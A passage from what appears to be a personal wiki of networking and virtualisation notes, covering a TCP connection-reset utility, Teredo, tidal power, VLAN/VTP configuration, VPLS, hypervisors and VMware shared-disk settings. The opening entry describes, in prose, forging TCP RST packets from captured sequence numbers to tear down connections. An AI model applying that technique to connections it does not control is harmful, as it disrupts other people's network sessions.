# Capture the first return packet for this connection, and use that seq no to send a reset. This will work if the seq no has not changed since we captures and sent a reset. If this connection is used heavily, then it might be possible that between the time we capture a packet and use its seq no, the seq no might have changed due to other content being exchanged between both parties. We only make only attempt and do not verify that the RST is acknowledged correctly. So this might have worked or might have failed. We also wait infinitely for the reply from remote side, if the remote side does not reply or is dead, its upto the caller to terminate this process.
# Send a tickle again, so that the remote site will send a RST back to the server and the server also clears the connections in its cache. 

Enhancements

# Automatically detect the device to be used for the given local ip
# Accept a timeout value as an argument and wait only for that time for reply from remote side 

!!!sfs_tcp_reset_ether
This program is similar to sfs_tcp_reset except that is sends ethernet level packets instead of IP level packets. Usage syntax as on 23rd Feb 2010 is

Usage: tcp_reset_ether device remote_mac remoteip port localip port

The device argument specifies the device on which the connection has been established. The remote_mac is the mac address of the remote ip, this mac address could be either be the mac address of the remote host or any gateway(if the remote host can only be reached from a gateway). Similar restrictions to device exists as in sfs_tcp_reset.

Steps during reset of the Connection

# Create a filter to capture incoming packets for this connection (localip:port -&gt; remoteip:port). We do this before sending out any packets, as we don't want to miss the ack that would be send immedieately after we send a tickle. If we create a filter after we send out a tickle, the reply from client could reach us before we start our capturing.
# Open a libnet handle to send packets out, with type LINK socket. This allows us to add even ethernet header. For a RAW4 socket we can only add IP headers and not ethernet headers. This can be used to reset NAT connections, whose traffic cannot be captured correctly by pcap.
# Send a tickle for this connection, so the remote side on receiving this packet will send out a packet with seq no (ack no). We are only interested in the seq no. The packets that we send out are verified for correct seq no by the remote side, if the seq no does not match with the expected seq no on the remote side, the remote side will discard it.
# Capture the first return packet for this connection, and use that seq no to send a reset. This will work if the seq no has not changed since we captures and sent a reset. If this connection is used heavily, then it might be possible that between the time we capture a packet and use its seq no, the seq no might have changed due to other content being exchanged between both parties. We only make only attempt and do not verify that the RST is acknowledged correctly. So this might have worked or might have failed. We also wait infinitely for the reply from remote side, if the remote side does not reply or is dead, its upto the caller to terminate this process. Fortunately, pcap can capture incoming packets of a NAT and not outgoing packets. So for NAT connections, we use ethernet level packets to send tickles and a normal pcap filter to captures the replies for seq no. </pre>

<div title="Teredo or IPv6 to IPv4" modifier="YourName" modified="200812051703" created="200812051702" changecount="3">
<pre>Teredo is a tunneling protocol designed to grant IPv6 connectivity to nodes that are located behind IPv6-unaware NAT devices. It defines a way of encapsulating IPv6 packets within IPv4 UDP datagrams that can be routed through NAT devices and on the IPv4 internet.

6to4, the most common IPv6 over IPv4 tunneling protocol, requires the tunnel endpoint to have a public IPv4 address. However, many hosts are currently attached to the IPv4 Internet through one or several NAT devices. In such a situation, the only available public IPv4 address is assigned to the NAT device.

Teredo alleviates this problem by encapsulating IPv6 packets within UDP/IPv4 datagrams, which most NATs can forward properly. Thus, IPv6-aware hosts behind NATs can be used as Teredo tunnel endpoints even when they don't have a dedicated public IPv4 address. In effect, a host implementing Teredo can gain IPv6 connectivity with no cooperation from the local network environment

Teredo node types

Teredo defines several different kind of nodes:
* A Teredo client is a host which has IPv4 connectivity to the internet from behind a NAT and uses the Teredo tunneling protocol to access the IPv6 Internet. Teredo clients are assigned an IPv6 address that starts with the Teredo prefix (2001:0000::/32).
* A Teredo server is a well-known host which is used for initial configuration of a Teredo tunnel. A Teredo server never forwards any traffic for the client (apart from IPv6 pings), and has therefore very modest bandwidth requirements (a few thousand bytes per minute per client at most), which allows a single server to support large numbers of clients. Additionally, a Teredo server can be implemented in a fully stateless manner.
* A Teredo relay serves as the remote end of a Teredo tunnel. A Teredo relay must forward all of the data on behalf of the Teredo clients it serves, with the exception of direct Teredo client to Teredo client exchanges. Therefore, a relay requires a lot of bandwidth and can only support a limited number of simultaneous clients. Each Teredo relay serves a range of IPv6 hosts (e.g. a single campus/company, an ISP or a whole operator network, or even the whole IPv6 Internet); it forwards traffic between any Teredo clients and any host within said range.
* A Teredo host-specific relay is a Teredo relay whose range of service is limited to the very host it runs on. As such, it has no particular bandwidth or routing requirements. A computer with a host-specific relay will use Teredo to communicate with Teredo clients, but it will stick to its main IPv6 connectivity provider to reach the rest of the IPv6 Internet.

<div title="Tidal Energy" modifier="YourName" modified="200811211750" created="200811211749" changecount="4">
<pre>!Tidal energy
Tidal power, sometimes called tidal energy, is a form of hydropower that converts the energy of tides into electricity or other useful forms of power.  Although not yet widely used, tidal power has potential for future electricity generation. Tides are more predictable than wind energy and solar power.

!Tidal Force
The tidal force is a secondary effect of the force of gravity and is responsible for the tides. It arises because the gravitational acceleration experienced by a large body is not constant across its diameter. One side of the body has greater acceleration than its center of mass, and the other side of the body has lesser acceleration.

When a body (body 1) is acted on by the gravity of another body (body 2), the field can vary significantly on body 1 between the side of the body facing body 2 and the side facing away from body 2. Figure 2 shows the differential force of gravity on a spherical body (body 1) exerted by another body (body 2). These so called tidal forces cause strains on both bodies and may distort them or even, in extreme cases, break one or the other apart.

[img[images/field.tidal.png]]

In above figure, the Moon's (or Sun's) gravity differential field at the surface of the earth is known as the Tide Generating Force. This is the primary mechanism that drives tidal action and explains two tidal equipotential bulges, accounting for two high tides per day.

In the case of an elastic sphere, the effect of a tidal force is to distort the shape of the body without any change in volume. The sphere becomes an ellipsoid, with two bulges, pointing towards and away from the other body. An elliptical distortion is approximately what happens to the Earth's oceans under the action of the Moon. The Earth and Moon rotate about their common center of mass or barycenter, and their gravitational attraction provides the centripetal force necessary to maintain this motion. To an observer on the Earth, very close to this barycenter, the situation is one of the Earth as body 1 acted upon by the gravity of the Moon as body 2. All parts of the Earth are subject to the Moon's gravitational forces, causing the water in the oceans to redistribute, forming bulges on the sides near the Moon and far from the Moon.

Tidal power is the only form of energy which derives directly from the relative motions of the Earth-Moon system, and to a lesser extent from the Earth-Sun system. 

Tidal movement causes a continual loss of mechanical energy in the Earth-Moon system due to pumping of water through the natural restrictions around coastlines, and due to viscous dissipation at the seabed and in turbulence. This loss of energy has caused the rotation of the Earth to slow in the 4.5 billion years since formation. During the last 620 million years the period of rotation has increased from 21.9 hours to the 24 hours we see now; in this period the Earth has lost 17% of its rotational energy. Tidal power may take additional energy from the system, increasing the rate of slowing over the next millions of years.

Tidal power can be classified into two main types:
* Tidal stream systems make use of the kinetic energy of moving water to power turbines, in a similar way to windmills that use moving air. This method is gaining in popularity because of the lower cost and lower ecological impact compared to barrages.
* Barrages make use of the potential energy in the difference in height (or head) between high and low tides. Barrages suffer from very high civil infrastructure costs, a worldwide shortage of viable sites, and environmental issues.

<pre>!AWM - Advanced Workload Management
Groups dependencies are specified as group compatability defintion. 
Load defiintions are now defined in terms of CPU load, network load, memory load. 
Groups have priorities. Higher priority groups could kick out lower priority groups which if the higher priority group have no where eles to login. 

!!Group transistion queue
Is a queue which maintains all the groups that are waiting to be onlined. When a group is kicked out of higher priority queue the group gets added into this GTQ. GTQ can be viewed and its entries can deleted. Its a priority based queue.

!Admin Privilege model
Admin privilege model has been changed to use a hierarchial organisational tree.

!VAL (Virtualisation Abstaction Layer)
Ensures HA for virtual machines and applications running in the ~VMs. VAL can discover what are ~VMs configured, and what are the applications running in the ~VMs. Supports prioritisation of ~VMs. Usecase is only one application is running in one ~VM. The purpose of the VM is to run the application, if the application goes down the VM is restarted to see if the application comes back online. VAL allows adaptive allocation of resources to ~VMs. 

Supports only vmware virtualisation as of now. 
Uses the vmware virtual centre to extract configuration information about the ~VMs and on which physical machines these ~VMs can be run. 

Data centres can be configured inside virtual centre. ~VMs can only be failed over onto physical machines in the same data centre. 

!Frames
Objects in a virtual environement are classified into frames. 3 types of frame objects
# physical frame (ex. ESX Server, ~PSeries ~ManagedServer)
# virtual frame  (ex. ESX virtual machine, IBM LPAR)
# Management Server Frame (ex. Vmware Virtual Centre / IBM HMC)

Physical frames have a capacity attribute that needs to be configured by the user. This capacity is shared amonng the virtual machine frames running on it. 

!!VAD system
A VAD system object is a system which is running VAD client. 

A virtual frame may or may not be linked to a VAD system object. If the virtual frame is linked to a VAD system object, the capacity of the ~VFrame is derived from the load of groups configured to run on the linked VAD system. In case, ~VFrame is not linked to a VAD system, user can configure the capacity attribute of a ~VFrame. 

[img[images/Frame.VCSOne.png]]

A VAD system is a failover destination for applications. 

If a ~VFrame is not linked to a VAD system, it means the ~VFrame needs to be HA, and the user does not want VAD to maange the applications inside the ~VFrame, i.e VAD has to manage ~VFrame for HA and not the applications inside the VM. Similarly we can have a VAD system not linked to a ~VFrame. In this case the user does not care about HA of ~VFrame but only needs HA for the applications. 

Each ~PFrame would also have VAD client running on it. It monitors various resources on that ~PFrame. 

There is a hidden group associated with each ~VFrame, and hidden VAD system associated with ~PFrame. 

A ~VFrame priority is the highest priority of all the groups configured to run in this ~VFrame. 

[img[images/VCSOne.hidden.objects.png]]

!Internal Object List
~InternalObjectList attribute contains hidden objects associated with the frame. For ~PFrames, the ~InternalObjectList contains a VAD system_name and a group_name.  For ~VFrames, the ~InternalObjectList contains group_name of the group whicc is monitoring this ~VFrame only. 

!Final Virtual Machine HA
Virtual machine HA is supported for both ~VMware and Xen. The physical servers need to install VAD client on them to be monitored. The virtual machines are monitored using VAD groups configured on these physical servers. The system associated with ~PFrame and group associated with ~VFrame are hidden to the user. 

!Frame State
For ~PFrames the state attribute reflects the name and state of the hidden system. For ~VFrames, the state attribute reflects the names and states of the hidden group on all ~PFrames.

<div title="VLAN" modifier="YourName" modified="201006080830" created="201006080607" changecount="15">
<pre>The protocol most commonly used today in configuring virtual LANs is IEEE 802.1Q. rior to the introduction of the 802.1Q standard, several proprietary protocols existed, such as Cisco's ISL (Inter-Switch Link) and 3Com's VLT (Virtual LAN Trunk). Cisco also implemented VLANs over FDDI by carrying VLAN information in an IEEE 802.10 frame header, contrary to the purpose of the IEEE 802.10 standard. 

Both ISL and IEEE 802.1Q tagging perform &quot;explicit tagging&quot; - the frame itself is tagged with VLAN information. ISL uses an external tagging process that does not modify the existing Ethernet frame, while 802.1Q uses a frame-internal field for tagging, and so does modify the Ethernet frame. This internal tagging is what allows IEEE 802.1Q to work on both access and trunk links: frames are standard Ethernet, and so can be handled by commodity hardware.

The IEEE 802.1Q header contains a 4-byte tag header containing a 2-byte tag protocol identifier (TPID) and a 2-byte tag control information (TCI). The TPID has a fixed value of 0x8100 that indicates that the frame carries the 802.1Q/802.1p tag information. The TCI contains the following elements:

* Three-bit user priority
* One-bit canonical format indicator (CFI)
* Twelve-bit VLAN identifier (VID)-Uniquely identifies the VLAN to which the frame belongs

With ISL, an Ethernet frame is encapsulated with a header that transports VLAN IDs between switches and routers. ISL does add overhead to the packet as a 26-byte header containing a 10-bit VLAN ID. In addition, a 4-byte CRC is appended to the end of each frame. This CRC is in addition to any frame checking that the Ethernet frame requires. The fields in an ISL header identify the frame as belonging to a particular VLAN.

A VLAN ID is added only if the frame is forwarded out a port configured as a trunk link. If the frame is to be forwarded out a port configured as an access link, the ISL encapsulation is removed.

!Vlan switchport modes
* ''access'' mode - vlan is configured on switch. Each port on the switch is set to be in 'access' mode and a corresponding vlan set. In this mode the ethernet packet coming out of the server is 1518 bytes and switch adds the vlan header to make the packet of size 1522.  Also called port-based VLANs.
* ''trunk'' mode - In trunk mode the ethernet packet coming out of server will itself consist of vlan header and packet size would be 1522. On the switch the port should be configured to be a 'trunk' port so that the switch does not add any more headers or change the headers. 

!Cisco VLAN ranges
* ''Normal range VLANs'' - VLAN range 1-1005. VLAN numbers 1002 through 1005 are reserved for Token Ring and FDDI VLANs.
* ''Extended range VLANs'' - VLAN range 1006-4094

!Cisco VLAN Trunking Protocol (VTP)
On Cisco Devices, VTP (VLAN Trunking Protocol) maintains VLAN configuration consistency across the entire network. VTP uses Layer 2 trunk frames to manage the addition, deletion, and renaming of VLANs on a network-wide basis from a centralized switch in the VTP server mode. VTP is responsible for synchronizing VLAN information within a VT|P domain and reduces the need to configure the same VLAN information on each switch.

VTP provides the following benefits:

    * VLAN configuration consistency across the network
    * Mapping scheme that allows a VLAN to be trunked over mixed media
    * Accurate tracking and monitoring of VLANs
    * Dynamic reporting of added VLANs across the network
    * Plug-and-play configuration when adding new VLANs

Before creating VLANs on the switch that will be propagated via VTP, a VTP domain must first be set up. A VTP domain for a network is a set of all contiguously trunked switches with the same VTP domain name. All switches in the same management domain share their VLAN information with each other, and a switch can participate in only one VTP management domain. Switches in different domains do not share VTP information.

Dynamic VLANs are created through the use of software. With a VLAN Management Policy Server (VMPS), an administrator can assign switch ports to VLANs dynamically based on information such as the source MAC address of the device connected to the port or the username used to log onto that device. As a device enters the network, the device queries a database for VLAN membership. See also FreeNAC which implements a VMPS server.

VTP only learns about normal-range VLANs (VLAN IDs 1 to 1005). Extended-range VLANs (VLAN IDs greater than 1005) are not supported by VTP or stored in the VTP VLAN database. 

!!! VTP Modes

| ''VTP Mode'' | ''Description'' |
| ''VTP server'' | In VTP server mode, you can create, modify, and delete VLANs, and specify other configuration parameters (such as the VTP version) for the entire VTP domain. VTP servers advertise their VLAN configurations to other switches in the same VTP domain and synchronize their VLAN configurations with other switches based on advertisements received over trunk links. In VTP server mode, VLAN configurations are saved in NVRAM. VTP server is the default mode.|
| ''VTP client'' | A VTP client behaves like a VTP server and transmits and receives VTP updates on its trunks, but you cannot create, change, or delete VLANs on a VTP client. VLANs are configured on another switch in the domain that is in server mode. In VTP client mode, VLAN configurations are not saved in NVRAM.|
| ''VTP transparent''(disabled) | VTP transparent switches do not participate in VTP. A VTP transparent switch does not advertise its VLAN configuration and does not synchronize its VLAN configuration based on received advertisements. However, in VTP Version 2, transparent switches do forward VTP advertisements that they receive from other switches through their trunk interfaces. You can create, modify, and delete VLANs on a switch in VTP transparent mode. |

The switch must be in VTP transparent mode when you create extended-range VLANs.

The switch must be in VTP transparent mode when you create private VLANs. 

When the switch is in VTP transparent mode, the VTP and VLAN configurations are saved in NVRAM, but they are not advertised to other switches. In this mode, VTP mode and domain name are saved in the switch running configuration, and you can save this information in the switch startup configuration file by using the copy running-config startup-config privileged EXEC command. The running configuration and the saved configuration are the same for all switches in a stack. 

!!! Configuring VTP

{{{
cisco&gt; enable
cisco # configure terminal
cisco (config) # vtp mode transparent
cisco (config) # end
cisco # show vtp status
}}}
Always ''copy running-config startup-config''.

!Protocol Based VLANs
In a protocol based VLAN enabled switch, traffic is forwarded through ports based on protocol. Essentially, the user tries to segregate or forward a particular protocol traffic from a port using the protocol based VLANs; traffic from any other protocol is not forwarded on the port. For example, if you have connected a host, pumping ARP traffic on the switch at port 10, connected a Lan pumping IPX traffic to the port 20 of the switch and connected a router pumping IP traffic on port 30, then if you define a protocol based VLAN supporting IP and including all the three ports 10, 20 and 30 then IP packets can be forwarded to the ports 10 and 20 also, but ARP traffic will not get forwarded to the ports 20 and 30, similarly IPX traffic will not get forwarded to ports 10 and 30.

!Port Membership Modes and Characteristics

| ''Membership Mode'' | ''VLAN Membership Characteristics'' | ''VTP Characteristics'' |
| ''Static-access'' | A static-access port can belong to one VLAN and is manually assigned to that VLAN. | VTP is not required. If you do not want VTP to globally propagate information, set the VTP mode to transparent. To participate in VTP, there must be at least one trunk port on the switch stack connected to a trunk port of a second switch or switch stack. |
| ''Trunk (ISL or IEEE 802.1Q)'' | A trunk port is a member of all VLANs by default, including extended-range VLANs, but membership can be limited by configuring the allowed-VLAN list. You can also modify the pruning-eligible list to block flooded traffic to VLANs on trunk ports that are included in the list. | VTP is recommended but not required. VTP maintains VLAN configuration consistency by managing the addition, deletion, and renaming of VLANs on a network-wide basis. VTP exchanges VLAN configuration messages with other switches over trunk links. |
| ''Dynamic access'' | A dynamic-access port can belong to one VLAN (VLAN ID 1 to 4094) and is dynamically assigned by a VMPS. The VMPS can be a Catalyst 5000 or Catalyst 6500 series switch, for example, but never a Catalyst 3750 switch. The Catalyst 3750 switch is a VMPS client. You can have dynamic-access ports and trunk ports on the same switch, but you must connect the dynamic-access port to an end station or hub and not to another switch. | VTP is required. Configure the VMPS and the client with the same VTP domain name. To participate in VTP, there must be at least one trunk port on the switch stack connected to a trunk port of a second switch or switch stack. |
| ''Voice VLAN'' | A voice VLAN port is an access port attached to a Cisco IP Phone, configured to use one VLAN for voice traffic and another VLAN for data traffic from a device attached to the phone. | VTP is not required; it has no affect on a voice VLAN. |
| ''Private VLAN'' | A private VLAN port is a host or promiscuous port that belongs to a private VLAN primary or secondary VLAN. | The switch must be in VTP transparent mode when you configure private VLANs. When private VLANs are configured on the switch, do not change VTP mode from transparent to client or server mode. |
| ''Tunnel (dot1q-tunnel)'' | Tunnel ports are used for IEEE 802.1Q tunneling to maintain customer VLAN integrity across a service-provider network. You configure a tunnel port on an edge switch in the service-provider network and connect it to an IEEE 802.1Q trunk port on a customer interface, creating an asymetric link. A tunnel port belongs to a single VLAN that is dedicated to tunneling. | VTP is not required. You manually assign the tunnel port to a VLAN by using the switchport access vlan interface configuration command. |

''Trunk Encapsulation Types'' 
| ''Encapsulation'' | ''Function'' |
| ''switchport trunk encapsulation isl'' | Specifies ISL encapsulation on the trunk link. |
| ''switchport trunk encapsulation dot1q'' | Specifies IEEE 802.1Q encapsulation on the trunk link. |
| ''switchport trunk encapsulation negotiate'' | Specifies that the interface negotiate with the neighboring interface to become an ISL (preferred) or IEEE 802.1Q trunk, depending on the configuration and capabilities of the neighboring interface. This is the default for the switch. |

!Cisco VMPS
The VLAN Query Protocol (VQP) is used to support dynamic-access ports, which are not permanently assigned to a VLAN, but give VLAN assignments based on the MAC source addresses seen on the port. Each time an unknown MAC address is seen, the switch sends a VQP query to a remote VMPS; the query includes the newly seen MAC address and the port on which it was seen. When the VMPS receives this query, it searches its database for a MAC-address-to-VLAN mapping. The VMPS responds with a VLAN assignment for the port. The switch cannot be a VMPS server but can act as a client to the VMPS and communicate with it through VQP.  In secure mode, the server shuts down the port when an illegal host is detected. In open mode, the server simply denies the host access to the port. The switch continues to monitor the packets directed to the port and sends a query to the VMPS when it identifies a new host address. If the switch receives a port-shutdown response from the VMPS, it disables the port. The port must be manually re-enabled by using Network Assistant, the CLI, or SNMP.

<div title="VPLS" modifier="YourName" modified="200811221145" created="200811221144" changecount="2">
<pre>!Bridge
A network bridge connects multiple network segments at the data link layer (layer 2) of the OSI model, and the term layer 2 switch is very often used interchangeably with bridge. 

In Ethernet networks, the term &quot;bridge&quot; formally means a device that behaves according to the IEEE 802.1D standard, this is most often referred to as a network switch in marketing literature. Bridges tend to be more complex than hubs or repeaters due to the fact that bridges are capable of analyzing incoming data packets on a network to determine if the bridge is able to send the given packet to another segment of that same network.

Switches that additionally process data at the Network layer (layer 3) (and above) are often referred to as Layer 3 switches or Multilayer switches.

At any layer, a modern switch may implement power over Ethernet (PoE), which avoids the need for attached devices, such as an IP telephone or wireless access point, to have a separate power supply.

!!! Transparent bridging 
This method uses a forwarding database to send frames across network segments. The forwarding database is initially empty and entries in the database are built as the bridge receives frames. If an address entry is not found in the forwarding database, the frame is rebroadcast to all ports of the bridge, forwarding the frame to all segments except the source address. 

By means of these broadcast frames, the destination network will respond and a route will be created. Along with recording the network segment to which a particular frame is to be sent, bridges may also record a bandwidth metric to avoid looping when multiple paths are available. Devices that have this transparent bridging functionality are also known as adaptive bridges. They are primarily found in Ethernet networks.

!!!Source route bridging 
With source route bridging two frame types are used in order to find the route to the destination network segment. Single-Route (SR) frames comprise most of the network traffic and have set destinations, while All-Route(AR) frames are used to find routes. 

Bridges send AR frames by broadcasting on all network branches; each step of the followed route is registered by the bridge performing it. Each frame has a maximum hop count, which is determined to be greater than the diameter of the network graph, and is decremented by each bridge. The first AR frame which reaches its destination is considered to have followed the best route, and the route can be used for subsequent SR frames; the other AR frames are discarded. 

This method of locating a destination network can allow for indirect load balancing among multiple bridges connecting two networks. The more a bridge is loaded, the less likely it is to take part in the route finding process for a new destination as it will be slow to forward packets. This method is very different from transparent bridge usage, where redundant bridges will be inactivated; however, more overhead is introduced to find routes, and space is wasted to store them in frames.

!!!Traffic monitoring on a switched network
Unless port mirroring or other methods such as RMON[10] or SMON are implemented in a switch, it is difficult to monitor traffic that is bridged using a switch because all ports are isolated until one transmits data, and even then only the sending and receiving ports can see the traffic. These monitoring features rarely are present on consumer-grade switches.

Two popular methods that are specifically designed to allow a network analyst to monitor traffic are:

* Port mirroring  - the switch sends a copy of network packets to a monitoring network connection.
* SMON - &quot;Switch Monitoring&quot; is described by RFC 2613 and is a protocol for controlling facilities such as port mirroring.

Another method to monitor may be to connect a Layer-1 hub between the monitored device and its switch port. This will induce minor delay, but will provide multiple interfaces that can be used to monitor the individual switch port.


!VPLS
Virtual private LAN service (VPLS) is a way to provide Ethernet based multipoint to multipoint communication over IP/MPLS networks. It allows geographically dispersed sites to share an Ethernet broadcast domain by connecting sites through pseudo-wires. The technologies that can be used as pseudo-wire can be Ethernet over MPLS, L2TPv3 or even GRE. There are two IETF standards track RFCs (RFC 4761 and RFC 4762) describing VPLS establishment.

VPLS is a virtual private network (VPN) technology. In contrast to layer 2 MPLS VPNs or L2TPv3, which allow only point-to-point layer 2 tunnels, VPLS allows any-to-any (multipoint) connectivity.

In a VPLS, the local area network (LAN) at each site is extended to the edge of the provider network. The provider network then emulates a switch or bridge to connect all of the customer LANs to create a single bridged LAN.

Since VPLS emulates a LAN, full mesh connectivity is required. There are two methods for full mesh establishment for VPLS: using BGP and using Label Distribution Protocol (LDP). The &quot;control plane&quot; is the means by which provider edge (PE) routers communicate for auto-discovery and signaling. Auto-discovery [1] refers to the process of finding other PE routers participating in the same VPN or VPLS. Signaling is the process of establishing pseudo-wires (PW). The PWs constitute the &quot;data plane&quot;, whereby PEs send customer VPN/VPLS traffic to other PEs.

With BGP, one has auto-discovery as well as signaling. The mechanisms used are very similar to those used in establishing Layer-3 MPLS VPNs. Each PE is configured to participate in a given VPLS. The PE, through the use of BGP, simultaneously discovers all other PEs in the same VPLS, and establishes a full mesh of pseudo-wires to those PEs.

With LDP, each PE router must be configured to participate in a given VPLS, and, in addition, be given the addresses of other PEs participating in the same VPLS. A full mesh of LDP sessions is then established between these PEs. LDP is then used to create an equivalent mesh of PWs between those PEs.

PEs participating in a VPLS-based VPN must appear as an Ethernet bridge to connected customer edge (CE) devices. Received Ethernet frames must be treated in such a way as to ensure CEs can be simple Ethernet devices.

When a PE receives a frame from a CE, it inspects the frame and learns the CE's MAC address, storing it locally along with LSP routing information. It then checks the frame's destination MAC address. If it is a broadcast frame, or the MAC address is not known to the PE, it floods the frame to all PEs in the mesh.

Ethernet does not have a time to live (TTL) field in its frame header, so loop avoidance must be arranged by other means. In regular Ethernet deployments, Spanning Tree Protocol is used for this. In VPLS, loop avoidance is arranged by the following rule: A PE never forwards a frame received from a PE, to another PE. The use of a full mesh combined with split horizon forwarding guarantees a loop-free broadcast domain.

VPLS is typically used to link a large number of sites together. Scalability is therefore an important issue that needs addressing.

<div title="Virtualisation" modifier="BhargavaKancherla" modified="200807151043" created="200801160659" changecount="12">
<pre>!!Full Virtualisation
also called true, classical, hardware, native, trap-and-emulate, hardware-virtural-machine
Properties of full virtualisation are
* Fidelity - Identical execution as guest or stand-alone. Guest should not be able to tell whether its running in a VM or not. 
* Performance - most instructions run at the same speed as native. 
* runs in a hidden segment with own protection, can see all hw state.
* can run multiple OSes of different versions concurrently
* recursive hypervisors (nested hypervisors)

!hypervisor
hypervisor is like an OS that provides virtual environments. 
2 types
# Binary Translation - modifies operating system code at run-time.  
# Para-vitrualisation - operating system code is modified before hand. 

!!Para-virtualisation
This presents a software interface to VMs that is similar but not identical to that of the underlying hardware. What usually happens each OS uses a HAL (hardware abstraction layer) which is ported to use hypervisor as another target architecture. Also supports batching of page-table operations. 

!Emulators
Usually not hypervisor-based and not usually considered virtualisation. Its a program that emulates entire CPU, motherboard and other peripherals. Sacrifies performance and easy to implement. One of the good known emulators is QEMU, KVM, VirtualBox.

Emulators also do dynamic translation of instructions ( also called Just-in-time compilation). About 4x slow as native. 

KQEMU is kernel-mode QEMU. Its a driver that works with QEMU, but does not do binary translation or patching, but executes code directly by arranging to trap-and-emulate privileged code. 

!XDC
supports para-virtualisation guests. Also supports unmodified guests but not hardware architectureus which have virtualisation support built-in. 

!!Domain
Dom0 is the first doamin started at boot time, it manages all the hardware, and also manages all the other domains. Dom0 is responsible for starting or stopping other domains, responsible for I/O and network traffic. Rest of the domains are called DomU which are called Under-priviliged domain. All these under-priviliged domains use Dom0 to perform any hardware interactions. 

[img[images/Xen.architecture.png]]

!Intel Ring Architecture
Intel cpu has levels called Rings. Operating systems usually run in Ring0. Ring0 has special privileged instrucntions that can only be run in Ring0. 

!Why XDC cannot support unmodified guests in old hardware
Hypervisor usually runs in Ring0, so virtual machines run in a lower level ring. So if the guests are not modified they would execute privilege instructions and cause faults. 

!How IntelVT helps
IntelVT allows both the hypervisor and virtual machines to run in Ring0. In Ring0 there are 2 modes
# Vmx-root
# Vmx-non-root
Hypervisor runts at Vmx-root and guest operating system runs at vmx-nonroot. Now guest operating systems running privilege instrunctions insted of being fauled go into hypervisor through some linkage, which is setup when the hypervrisor starts. 

IntelVT has different varieties
# Vanderpool
# VT-x (virtualisation on x86)
# VT-I (virtualisation on Itanium)
# VT-d (virtualisation of dma

!Intel EPT and AMD NPT ( Extended/Nested Page Tables )
hypervisor usually fakes page tables. Instead of hypervisor maintaining another page translation these technologies provide automatinc page translation. 

!Page sharing 
Paravirtualision driver shares pages with guest operating system, so that the network and I/O traffic do not experience any performance problems. The frontend and backend drivers share pages. 

!OS ABI ( Application Binary Interface ) virtualisation
Its virtualiation inside a single OS. Each process is provided a virutalised environment in which it can work. The virtualistaion environment would have different filesystem namespaces, devices and other stuff.  It provides best performance as native. 
Also called namespace-virtualisation os-level virtualisation, kernel-level virtualistaion, virtual environments, os partitioning, partitions, soft-partitions, compartmentalistaion, virtual private servers, light-weight virtualistaion. 

Some of the implementations of this virtualistaion are FreeBSD jails, Solaris Containers, Solaris Zones, AIX micro-partitions, HP vPars, Linux VServer, Linuc OpenVZ, Virtuozzo

!Application ABI Virtualisation
Since this is at application, it does not require modifying OS. Filter drivers intercept and alter all path specifiers relevant to I/O. Provides different namespaces, different copies of recources. 

Some of the implementations are Altiris SVS and Microsoft Softgrid. 

!Vmware ESX
hypervisor runs on physical machine called vmkernel. Driviers are directly included in the hypervisor, because of which it only supported small list of enterprise class hardware. 
Each VM is managed by Virtual Machine Monitor, which monitors the address space of the virtual machine and also just-in-compilations of virtual machine x86 code. 
Linux VM called Console OS provides management interface. 
ESX 3i puts the hypervisor on flash memory.

!Live Migration
Live Migration allows an application running in an guest OS to be migrated to naother guest on a different physical server with very little downtime ( less than a second ). 
During live migration the hypervisor on the first server moves the non-dirty pages on to the other hypervisor, and then tries to move dirty pages. It keeps trying this in a loop until it has very little pages to move, then it would perform the switch. The time delay is the delay in copying the last few pages. 
Vmware calls this feature as VMotion. 

!Microsoft Hyper-V
The architecture is similar to Xen. Similar to Xen's Dom0, windows calls it as Parent Partition. It is privileged virtual machine that manages other VMs and contains the drivers for physical devices. All the physical pages are directly get mapped to this VM's pages when required. 
Rest of the virtual machines have child partitions (similar to DomU's in Xen).

!Viridan

[img[images/virtualisation_architectures.jpg]]

Parents are arranged in a tree, parents manage children. Each parent contains a Virtualisation Stack, manages child's memory, manages virtual devices. In WSV there is only one parent.

Guests communicate with the hypervisor via hypercalls
#Hypervisor equivalent of system call
#Detected via ~CpuId
#Configured via MSR (Model Specific Register)

The hypervisor schedules cores. 

Partitions are the unit of containment, Virtual Machine (VM) refers to the partition and its state.
Guests are software that run in a partition, such as ''Guest OS''
''Virtual Processors (VP)'' correspond to logical processors 

''Physical System === Parition''
''Logical Processor === Virtual Processor''

Most guests expect physically contigous memory starting at zero.
#Not everybody can start at zero
#Contigous memory hard to find after boot

<pre>!Configure Shared Disk Resources
The way to spoof your virtual machines into believing that they have access to shared disk resources. In my quest for clustering I found two resources on this, one was hideously outdated - but contained enough theory to help me out, The other was for version 4.5x and was missing one critical piece of data that is apparently now needed in ~VMWare Workstation 5.0. The key concepts here are that you just need to create SCSI controllers on both machines, and then provide directives that tell ~VMWare NOT to lock the disks when they are connected. This lets machines share disks, as long as all of the SCSI connection info is configured correctly. From there you just need to, obviously, make sure that the disks aren't busy trying to dynamically allocate size; i.e. the disks have to be fixed or each VM will see a different size, state, etc. 

The first thing you need to do is create some drives that you'll hook up to your machines. The best way to do this is to just create them with the wizard by 'adding' them to one of your machines, and then immediately removing them. Think of it as a virtual-hard-drive-egg-laying-chicken (or just think of it as a way to make virtual hard drives, if that's easier). To Proceed:

* Open up one of your ~VMs and Select VM | Settings from the menu. To add the drives just click Add and use the Wizard.
* The first drive will be your Quorum drive, and just needs to be a few hundred MB (200 MB will work fine - or .2GB).
* The wizard steps are as follows: Create a new virtual disk. Next. SCSI. Next. Disk Size = .x GB Then ensure that Allocate all disk space now is checked. Click Next. Browse out and drop the disks in a directory called ~SharedDisks (or something). And click the Advanced button. Make sure that Independent is checked. Then click Finish.
* Create as many disks as you want
* Then select each drive, and Remove it in the Hardware management thingy. We just needed to MAKE Hard Drives, we don't want to add them just now. (You'll add them by hand to the machines in a second.)

!Attaching Shared Disks
Add your virtual shared drives to the boxes by hand. Now that the drives are sized and created, it's time to head to the virtual server rack and hook up some virtual SCSI controllers.

* Navigate to the directories where your Virtual Machines are kept, and for Server 1 open the .vmx file in ~NotePad.
* First add some instructions for disk control, and to make sure that the VM won't attempt to lock the drives it connects to:

{{{
    # Shared Disk Config Info:
      diskLib.dataCacheMaxSize = &quot; 0&quot;
      diskLib.dataCacheMaxReadAheadSize = &quot; 0&quot;
      diskLib.dataCacheMinReadAheadSize = &quot;0&quot; 
      diskLib.dataCachePageSize = &quot;4096&quot;
      diskLib.maxUnsyncedWrites = &quot;0&quot; 
      disk.locking = &quot;FALSE&quot;
}}}

* Then add a new SCSI controller:

{{{
      scsi1.present = &quot;TRUE&quot;
